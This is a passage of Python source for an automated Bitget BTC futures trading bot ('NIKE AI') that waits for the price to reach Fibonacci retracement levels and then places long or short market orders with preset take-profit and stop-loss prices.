                                                    print('NIKE AI 0.236% Waiting ....')
                                                    print('Golden Ratio Long Positon Estimated Entry Zones(0.236%): ' + str(fibo_0236))
                                                    print('Golden Ratio Long Positon Estimated Profit Zones(0.5%): ' + str(fibo_0500))
                                                    print('Golden Ratio Long Positon Estimated Less Zones(-0.13%): ' + str(fibo_Minus013))
                                                    start_time = time.time()
                                                    
                                                    while current_price > fibo_0236 + fibo_error or current_price < fibo_0236 - fibo_error2:
                                                        current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                        elapsed_time = time.time() - start_time
                                                        if elapsed_time > 900:
                                                            print('OverTime.... Retry.....')
                                                            return
                                                    
                                                    print('Order in progress...')
                                                    
                                                    if TP_excute == True:
                                                        result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0236, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_0500, presetStopLossPrice=fibo_Minus013)
                                                    else:  
                                                        print('TP Set X')
                                                        result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0236, marginCoin='USDT', clientOrderId=random_string('buy'), presetStopLossPrice=fibo_Minus013)
                                                else:  
                                                    if Trade_Level['D'] == 1:
                                                        current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                        print('NIKE AI 0.236% Waiting ....')
                                                        print('Golden Ratio Long Positon Estimated Entry Zones(0.236%): ' + str(fibo_0236))
                                                        print('Golden Ratio Long Positon Estimated Profit Zones(0.618%): ' + str(fibo_0618))
                                                        print('Golden Ratio Long Positon Estimated Less Zones(-0.13%): ' + str(fibo_Minus013))
                                                        start_time = time.time()
                                                        
                                                        while current_price > fibo_0236 + fibo_error or current_price < fibo_0236 - fibo_error2:
                                                            current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                            elapsed_time = time.time() - start_time
                                                            if elapsed_time > 900:
                                                                print('OverTime.... Retry.....')
                                                                return
                                                        print('Order in progress...')
                                                        
                                                        if TP_excute == True:
                                                            result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0236, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_0618, presetStopLossPrice=fibo_Minus013)
                                                        else:  
                                                            print('TP Set X')
                                                            result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0236, marginCoin='USDT', clientOrderId=random_string('buy'), presetStopLossPrice=fibo_Minus013)
                        if result!= 'No orders yet':
                            print(f'Order results: {result}')
                            timestamp = time.time()
                            local_timezone = pytz.timezone('Asia/Tokyo')
                            local_time = datetime.fromtimestamp(timestamp, local_timezone)
                            formatted_time = local_time.strftime('%Y-%m-%d %H:%M:%S')
                            print(f'Order request time (local time): {formatted_time}')
                        pass
            else:  
                print('Insufficient USDT balance')
                print('Available order amount (USDT) : ', USDT_balance)
                print('Please make sure your available order amount is at least 0.001 BTC')
    except Exception as e:
        if '40762' in str(e):
            print('The order amount exceeds your balance. Check your balance and adjust the order amount.')
        print(f'Purchase order execution fails: {e}')

def open_long_extension(bitget, trade_size):
    start_time = 0
    formatted_time = 0
    result = 'No orders yet'
    position_data = bitget.mix_get_single_position(symbol=bitget_symbol, marginCoin='USDT')['data']
    try:
        if not isinstance(position_data, list) or leave_bus == True:
            pass
        else:  
            USDT_balance = float(bitget.mix_get_accounts(productType='umcbl')['data'][0]['available'])
            if USDT_balance > 67:
                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                if fibo_0000 == 0 or fibo_0130 == 0 or fibo_0236 == 0 or (fibo_0382 == 0) or (fibo_0500 == 0) or (fibo_0618 == 0):
                    
                    pass
                else:  
                    if fibo_0618 < current_price:
                        if Trade_Level['A'] == 1:
                            
                            print('Golden Ratio Long Positon Estimated Entry Zones(0.87%): ' + str(fibo_0870))
                            print('Golden Ratio Long Positon Estimated Profit Zones(1.13%): ' + str(fibo_1130))
                            print('Golden Ratio Long Positon Estimated Less Zones(0.618%): ' + str(fibo_0618))
                            
                            current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                            start_time = int(time.time())
                            while current_price > fibo_0870 + fibo_error or current_price < fibo_0870 - fibo_error2:
                                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                elapsed_time = int(time.time()) - start_time
                                if elapsed_time > 60:
                                    print("OverTime.... Retry...")
                                    return
                                    
                            print('Order in progress...')

                            if TP_excute == True:
                                result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0870, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_1130, presetStopLossPrice=fibo_0618)
                        else:  
                            if Trade_Level['B'] == 1:
                                print('Golden Ratio Long Positon Estimated Entry Zones(0.87%): ' + str(fibo_0870))
                                print('Golden Ratio Long Positon Estimated Profit Zones(1.13%): ' + str(fibo_1130))
                                print('Golden Ratio Long Positon Estimated Less Zones(0.5%): ' + str(fibo_0500))
                                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                start_time = time.time()
                                while current_price > fibo_0870 + fibo_error or current_price < fibo_0870 - fibo_error2:
                                    current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                    elapsed_time = int(time.time()) - start_time
                                    if elapsed_time > 60:
                                        print("OverTime.... Retry...")
                                        return
                                print('Order in progress...')
                                
                                if TP_excute == True:
                                    result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0870, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_1130, presetStopLossPrice=fibo_0500)
                            else:  
                                if Trade_Level['C'] == 1:
                                    
                                    print('Golden Ratio Long Positon Estimated Entry Zones(0.87%): ' + str(fibo_0870))
                                    print('Golden Ratio Long Positon Estimated Profit Zones(1.13%): ' + str(fibo_1130))
                                    print('Golden Ratio Long Positon Estimated Less Zones(0.382%): ' + str(fibo_0382))
                                    
                                    current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                    start_time = int(time.time())
                                    while current_price > fibo_0870 + fibo_error or current_price < fibo_0870 - fibo_error2:
                                        current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                        elapsed_time = time.time() - start_time
                                        if elapsed_time > 60:
                                            print("OverTime.... Retry...")
                                            return
                                    print('Order in progress...')
                                    
                                    if TP_excute == True:
                                        result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0870, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_1130, presetStopLossPrice=fibo_0382)
                                else:  
                                    if Trade_Level['D'] == 1:
                                        print('Golden Ratio Long Positon Estimated Entry Zones(0.87%): ' + str(fibo_0870))
                                        print('Golden Ratio Long Positon Estimated Profit Zones(1.236%): ' + str(fibo_1236))
                                        print('Golden Ratio Long Positon Estimated Less Zones(0.618%): ' + str(fibo_0618))
                                        
                                        current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                        start_time = int(time.time())
                                        
                                        while current_price > fibo_0870 + fibo_error or current_price < fibo_0870 - fibo_error2:
                                            current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                            elapsed_time = int(time.time()) - start_time
                                            if elapsed_time > 60:
                                                print("OverTime.... Retry...")
                                                return
                                        
                                        print('Order in progress...')
                                        
                                        if TP_excute == True:
                                            result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0870, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_1236, presetStopLossPrice=fibo_0618)
                                    else:  
                                        if Trade_Level['E'] == 1:
                                            
                                            print('Golden Ratio Long Positon Estimated Entry Zones(0.87%): ' + str(fibo_0870))
                                            print('Golden Ratio Long Positon Estimated Profit Zones(1.236%): ' + str(fibo_1236))
                                            print('Golden Ratio Long Positon Estimated Less Zones(0.5%): ' + str(fibo_0500))
                                            
                                            
                                            current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                            start_time = int(time.time())
                                            
                                            while current_price > fibo_0870 + fibo_error or current_price < fibo_0870 - fibo_error2:
                                                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                elapsed_time = int(time.time()) - start_time
                                                if elapsed_time > 60:
                                                    print("OverTime.... Retry...")
                                                    return
                                            
                                            print('Order in progress...')
                                            
                                            if TP_excute == True:
                                                result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0870, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_1236, presetStopLossPrice=fibo_0500)
                                        else:  
                                            if Trade_Level['F'] == 1:
                                                
                                                print('Golden Ratio Long Positon Estimated Entry Zones(0.87%): ' + str(fibo_0870))
                                                print('Golden Ratio Long Positon Estimated Profit Zones(1.236%): ' + str(fibo_1236))
                                                print('Golden Ratio Long Positon Estimated Less Zones(0.382%): ' + str(fibo_0382))
                                                
                                                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                start_time = int(time.time())
                                                
                                                while current_price > fibo_0870 + fibo_error or current_price < fibo_0870 - fibo_error2:
                                                    current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                    elapsed_time = int(time.time()) - start_time
                                                    if elapsed_time > 60:
                                                        print("OverTime.... Retry...")
                                                        return
                                                
                                                print('Order in progress...')
                                                
                                                if TP_excute == True:
                                                    result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0870, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_1236, presetStopLossPrice=fibo_0382)
                                            else:  
                                                if Trade_Level['G'] == 1:
                                                    
                                                    print('Golden Ratio Long Positon Estimated Entry Zones(0.87%): ' + str(fibo_0870))
                                                    print('Golden Ratio Long Positon Estimated Profit Zones(1.5%): ' + str(fibo_1500))
                                                    print('Golden Ratio Long Positon Estimated Less Zones(0.618%): ' + str(fibo_0618))
                                                        
                                                    current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                    start_time = int(time.time())
                                                    
                                                    while current_price > fibo_0870 + fibo_error or current_price < fibo_0870 - fibo_error2:
                                                        current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                        elapsed_time = int(time.time()) - start_time
                                                        if elapsed_time > 60:
                                                            print("OverTime.... Retry...")
                                                            return
                                                    
                                                    print('Order in progress...')
                                                    
                                                    if TP_excute == True:
                                                        result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0870, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_1500, presetStopLossPrice=fibo_0618)
                                                else:  
                                                    if Trade_Level['H'] == 1:
                                                        print('Golden Ratio Long Positon Estimated Entry Zones(0.87%): ' + str(fibo_0870))
                                                        print('Golden Ratio Long Positon Estimated Profit Zones(1.5%): ' + str(fibo_1500))
                                                        print('Golden Ratio Long Positon Estimated Less Zones(0.5%): ' + str(fibo_0500))
                                                        current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                        start_time = int(time.time())
                                                        
                                                        while current_price > fibo_0870 + fibo_error or current_price < fibo_0870 - fibo_error2:
                                                            current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                            elapsed_time = int(time.time()) - start_time
                                                            if elapsed_time > 60:
                                                                print("OverTime.... Retry...")
                                                                return                      
                                                        print('Order in progress...')
                                                        
                                                        if TP_excute == True:
                                                            result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0870, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_1500, presetStopLossPrice=fibo_0500)
                                                    else:  
                                                        if Trade_Level['I'] == 1:
                                                            print('Golden Ratio Long Positon Estimated Entry Zones(0.87%): ' + str(fibo_0870))
                                                            print('Golden Ratio Long Positon Estimated Profit Zones(1.5%): ' + str(fibo_1500))
                                                            print('Golden Ratio Long Positon Estimated Less Zones(0.382%): ' + str(fibo_0382))
                                                            current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                            start_time = int(time.time())
                                                            
                                                            while current_price > fibo_0870 + fibo_error or current_price < fibo_0870 - fibo_error2:
                                                                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                                elapsed_time = int(time.time()) - start_time
                                                                if elapsed_time > 60:
                                                                    print("OverTime.... Retry...")
                                                                    return
                                                            
                                                            print('Order in progress...')
                                                            
                                                            if TP_excute == True:
                                                                result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0870, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_1500, presetStopLossPrice=fibo_0382)
                        if result!= 'No orders yet':
                            print(f'Order results: {result}')
                            timestamp = time.time()
                            local_timezone = pytz.timezone('Asia/Tokyo')
                            local_time = datetime.fromtimestamp(timestamp, local_timezone)
                            formatted_time = local_time.strftime('%Y-%m-%d %H:%M:%S')
                            print(f'Order request time (local time): {formatted_time}')
                        pass
            else:  
                print('Insufficient USDT balance')
                print('Available order amount (USDT) : ', USDT_balance)
                print('Please make sure your available order amount is at least 0.001 BTC')
    except Exception as e:
        if '40762' in str(e):
            print('The order amount exceeds your balance. Check your balance and adjust the order amount.')
        print(f'Purchase order execution fails: {e}')

def close_long(bitget, trade_size):
    print('Trying to sell BTC...')
    try:
        position_data = bitget.mix_get_single_position(symbol=bitget_symbol, marginCoin='USDT')['data']
        print(f'Positon Data Structures: {position_data}')
        if isinstance(position_data, list) and position_data and (position_data[0]['holdSide'] == 'long'):
            print('Order in progress...')
            result = bitget.mix_place_order(symbol=bitget_symbol, side='close_long', orderType='market', size=trade_size, marginCoin='USDT', clientOrderId=random_string('sell'))
            print(f'Successful sales orders: {result}')
        else:  
            print('No Long Positon to close')
    except Exception as e:
        print(f'Failed to execute a sales order: {e}')

def open_short(bitget, trade_size):
    start_time = 0
    result = 'No orders yet'
    formatted_time = 0
    try:
        position_data = bitget.mix_get_single_position(symbol=bitget_symbol, marginCoin='USDT')['data']
        if not isinstance(position_data, list) or leave_bus == True:
            pass
        else:  
            USDT_balance = float(bitget.mix_get_accounts(productType='umcbl')['data'][0]['available'])
            if USDT_balance > 67:
                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                if fibo_0000 == 0 or fibo_0130 == 0 or fibo_0236 == 0 or (fibo_0382 == 0) or (fibo_0500 == 0) or (fibo_0618 == 0) or (fibo_0764 >= current_price):
                    pass
                else:  
                    if current_price > fibo_0764 and current_price < fibo_1000:
                        if Trade_Level['E'] == 1:
                            current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                            start_time = int(time.time())
                            while True:  
                                while current_price > fibo_0870 + fibo_error or current_price < fibo_0870 - fibo_error2:
                                    current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                    elapsed_time = int(time.time()) - start_time
                                    if elapsed_time > 60:
                                        break
                            else:  
                                print('Order in progress...')
                                print('Golden Ratio Short Positon Estimated Enter Zones(0.13%): ' + str(fibo_0870))
                                print('Golden Ratio Short Positon Estimated Profit Zones(0.5%): ' + str(fibo_0500))
                                print('Golden Ratio Short Positon Estimated Less Zones(0%): ' + str(fibo_1000))
                                if TP_excute == True:
                                    result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0870, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_0500, presetStopLossPrice=fibo_1000)
                                else:  
                                    print('TP Set X')
                                    result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0870, marginCoin='USDT', clientOrderId=random_string('buy'), presetStopLossPrice=fibo_1000)
                        else:  
                            if Trade_Level['F'] == 1:
                                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                start_time = int(time.time())
                                while True:  
                                    while current_price > fibo_0870 + fibo_error or current_price < fibo_0870 - fibo_error2:
                                        current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                        elapsed_time = int(time.time()) - start_time
                                        if elapsed_time > 60:
                                            break
                                else:  
                                    print('Order in progress...')
                                    print('Golden Ratio Short Positon Estimated Enter Zones(0.13%): ' + str(fibo_0870))
                                    print('Golden Ratio Short Positon Estimated Profit Zones(0.618%): ' + str(fibo_0382))
                                    print('Golden Ratio Short Positon Estimated Less Zones(0%): ' + str(fibo_1000))
                                    if TP_excute == True:
                                        result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0870, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_0382, presetStopLossPrice=fibo_1000)
                                    else:  
                                        print('TP Set X')
                                        result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0870, marginCoin='USDT', clientOrderId=random_string('buy'), presetStopLossPrice=fibo_1000)
                            else:  
                                if Trade_Level['A'] == 1:
                                    current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                    start_time = int(time.time())
                                    while True:  
                                        while current_price > fibo_0764 + fibo_error or current_price < fibo_0764 - fibo_error2:
                                            current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                            elapsed_time = int(time.time()) - start_time
                                            if elapsed_time > 60:
                                                print('OverTime.... Retry.....')
                                                break
                                    else:  
                                        print('Order in progress...')
                                        print('Golden Ratio Short Positon Estimated Enter Zones(0.236%): ' + str(fibo_0764))
                                        print('Golden Ratio Short Positon Estimated Profit Zones(0.5%): ' + str(fibo_0500))
                                        print('Golden Ratio Short Positon Estimated Less Zones(0%): ' + str(fibo_1000))
                                        if TP_excute == True:
                                            result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0764, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_0500, presetStopLossPrice=fibo_1000)
                                        else:  
                                            print('TP Set X')
                                            result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0764, marginCoin='USDT', clientOrderId=random_string('buy'), presetStopLossPrice=fibo_1000)
                                else:  
                                    if Trade_Level['B'] == 1:
                                        current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                        start_time = int(time.time())
                                        while True:  
                                            while current_price > fibo_0764 + fibo_error or current_price < fibo_0764 - fibo_error2:
                                                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                elapsed_time = int(time.time()) - start_time
                                                if elapsed_time > 60:
                                                    print('OverTime.... Retry.....')
                                                    break
                                        else:  
                                            print('Order in progress...')
                                            print('Golden Ratio Short Positon Estimated Enter Zones(0.236%): ' + str(fibo_0764))
                                            print('Golden Ratio Short Positon Estimated Profit Zones(0.618%): ' + str(fibo_0382))
                                            print('Golden Ratio Short Positon Estimated Less Zones(0%): ' + str(fibo_1000))
                                            if TP_excute == True:
                                                result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0764, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_0382, presetStopLossPrice=fibo_1000)
                                            else:  
                                                print('TP Set X')
                                                result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0764, marginCoin='USDT', clientOrderId=random_string('buy'), presetStopLossPrice=fibo_1000)
                                    else:  
                                        if Trade_Level['G'] == 1:
                                            current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                            start_time = int(time.time())
                                            while True:  
                                                while current_price > fibo_0870 + fibo_error or current_price < fibo_0870 - fibo_error2:
                                                    current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                    elapsed_time = int(time.time()) - start_time
                                                    if elapsed_time > 60:
                                                        print('OverTime.... Retry.....')
                                                        break
                                            else:  
                                                print('Order in progress...')
                                                print('Golden Ratio Short Positon Estimated Enter Zones(0.13%): ' + str(fibo_0870))
                                                print('Golden Ratio Short Positon Estimated Profit Zones(0.5%): ' + str(fibo_0500))
                                                print('Golden Ratio Short Positon Estimated Less Zones(-0.13%): ' + str(fibo_1130))
                                                if TP_excute == True:
                                                    result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0870, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_0500, presetStopLossPrice=fibo_1130)
                                                else:  
                                                    print('TP Set X')
                                                    result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0870, marginCoin='USDT', clientOrderId=random_string('buy'), presetStopLossPrice=fibo_1130)
                                        else:  
                                            if Trade_Level['H'] == 1:
                                                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                start_time = int(time.time())
                                                while True:  
                                                    while current_price > fibo_0870 + fibo_error or current_price < fibo_0870 - fibo_error2:
                                                        current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                        elapsed_time = int(time.time()) - start_time
                                                        if elapsed_time > 60:
                                                            print('OverTime.... Retry.....')
                                                            break
                                                else:  
                                                    print('Order in progress...')
                                                    print('Golden Ratio Short Positon Estimated Enter Zones(0.13%): ' + str(fibo_0870))
                                                    print('Golden Ratio Short Positon Estimated Profit Zones1(0.618%): ' + str(fibo_0382))
                                                    print('Golden Ratio Short Positon Estimated Less Zones(-0.13%): ' + str(fibo_1130))
                                                    if TP_excute == True:
                                                        result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0870, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_0382, presetStopLossPrice=fibo_1130)
                                                    else:  
                                                        print('TP Set X')
                                                        result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0870, marginCoin='USDT', clientOrderId=random_string('buy'), presetStopLossPrice=fibo_1130)
                                            else:  
                                                if Trade_Level['C'] == 1:
                                                    current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                    start_time = int(time.time())
                                                    while True:  
                                                        while current_price > fibo_0764 + fibo_error or current_price < fibo_0764 - fibo_error2:
                                                            current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                            elapsed_time = int(time.time()) - start_time
                                                            if elapsed_time > 60:
                                                                print('OverTime.... Retry.....')
                                                                break
                                                    else:  
                                                        print('Order in progress...')
                                                        print('Golden Ratio Short Positon Estimated Enter Zones(0.236%): ' + str(fibo_0764))
                                                        print('Golden Ratio Short Positon Estimated Profit Zones(0.5%): ' + str(fibo_0500))
                                                        print('Golden Ratio Short Positon Estimated Less Zones(-0.13%): ' + str(fibo_1130))
                                                        if TP_excute == True:
                                                            result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0764, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_0500, presetStopLossPrice=fibo_1130)
                                                        else:  
                                                            print('TP Set X')
                                                            result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0764, marginCoin='USDT', clientOrderId=random_string('buy'), presetStopLossPrice=fibo_1130)
                                                else:  
                                                    if Trade_Level['D'] == 1:
                                                        current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                        start_time = int(time.time())
                                                        while True:  
                                                            while current_price > fibo_0764 + fibo_error or current_price < fibo_0764 - fibo_error2:
                                                                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                                elapsed_time = int(time.time()) - start_time
                                                                if elapsed_time > 60:
                                                                    print('OverTime.... Retry.....')
                                                                    break
                                                        else:  
                                                            print('Order in progress...')
                                                            print('Golden Ratio Short Positon Estimated Enter Zones(0.236%): ' + str(fibo_0764))
                                                            print('Golden Ratio Short Positon Estimated Profit Zones(0.618%): ' + str(fibo_0382))
                                                            print('Golden Ratio Short Positon Estimated Less Zones(-0.13%): ' + str(fibo_1130))
                                                            if TP_excute == True:
                                                                result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0764, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_0382, presetStopLossPrice=fibo_1130)
                                                            else:  
                                                                result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0764, marginCoin='USDT', clientOrderId=random_string('buy'), presetStopLossPrice=fibo_1130)
                        if result!= 'No orders yet':
                            print(f'Order Result : {result}')
                            timestamp = time.time()
                            local_timezone = pytz.timezone('Asia/Tokyo')
                            local_time = datetime.fromtimestamp(timestamp, local_timezone)
                            formatted_time = local_time.strftime('%Y-%m-%d %H:%M:%S')
                            print(f'Order request time (local time): {formatted_time}')
                    else:  
                        print('Leave the bus')
            else:  
                print('Insufficient USDT balance')
                print('Available order amount (USDT) : ', USDT_balance)
                print('Please make sure your available order amount is at least 0.001 BTC')
    except Exception as e:
        if '40762' in str(e):
            print('The order amount exceeds your balance. Check your balance and adjust the order amount.')
        print(f'Failed order execution: {e}')
        print(f'Failed Short order execution: {e}')

def open_short_extension(bitget, trade_size):
    start_time = 0
    result = 'No orders yet'
    formatted_time = 0
    try:
        position_data = bitget.mix_get_single_position(symbol=bitget_symbol, marginCoin='USDT')['data']
        if not isinstance(position_data, list) or leave_bus == True:
            pass
        else:  
            USDT_balance = float(bitget.mix_get_accounts(productType='umcbl')['data'][0]['available'])
            if USDT_balance > 67:
                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                if fibo_0000 == 0 or fibo_0130 == 0 or fibo_0236 == 0 or (fibo_0382 == 0) or (fibo_0500 == 0) or (fibo_0618 == 0):
                    pass
                else:  
                    if current_price < fibo_0382:
                        if Trade_Level['A'] == 1:
                            print('Golden Ratio Short Positon Estimated Enter Zones(0.87%): ' + str(fibo_0130))
                            print('Golden Ratio Short Positon Estimated Profit Zones(1.13%): ' + str(fibo_Minus013))
                            print('Golden Ratio Short Positon Estimated Less Zones(0.618%): ' + str(fibo_0382))
                            
                            current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                            start_time = int(time.time())
                            while current_price > fibo_0130 + fibo_error or current_price < fibo_0130 - fibo_error * 2:
                                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                elapsed_time = int(time.time()) - start_time
                                if elapsed_time > 60:
                                    print('OverTime.... Retry...')
                                    return
                            print('Order in progress...')

                            if TP_excute == True:
                                result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0130, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_Minus013, presetStopLossPrice=fibo_0382)
                        else:  
                            if Trade_Level['B'] == 1:
                                print('Golden Ratio Short Positon Estimated Enter Zones(0.87%): ' + str(fibo_0130))
                                print('Golden Ratio Short Positon Estimated Profit Zones(1.13%): ' + str(fibo_Minus013))
                                print('Golden Ratio Short Positon Estimated Less Zones(0.5%): ' + str(fibo_0500))
                                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                start_time = int(time.time())
                                
                                while current_price > fibo_0130 + fibo_error or current_price < fibo_0130 - fibo_error * 2:
                                    current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                    elapsed_time = int(time.time()) - start_time
                                    if elapsed_time > 60:
                                        print('OverTime.... Retry...')
                                        return
                                
                                print('Order in progress...')
                                
                                if TP_excute == True:
                                    result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0130, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_Minus013, presetStopLossPrice=fibo_0500)
                            else:  
                                if Trade_Level['C'] == 1:
                                    print('Golden Ratio Short Positon Estimated Enter Zones(0.87%): ' + str(fibo_0130))
                                    print('Golden Ratio Short Positon Estimated Profit Zones(1.3%): ' + str(fibo_Minus013))
                                    print('Golden Ratio Short Positon Estimated Less Zones(0.382%): ' + str(fibo_0618))
                                    
                                    current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                    start_time = int(time.time())
                                    
                                    while current_price > fibo_0130 + fibo_error or current_price < fibo_0130 - fibo_error * 2:
                                        current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                        elapsed_time = int(time.time()) - start_time
                                        if elapsed_time > 60:
                                            print('OverTime.... Retry...')
                                            return
                                    
                                    print('Order in progress...')
                                    
                                    if TP_excute == True:
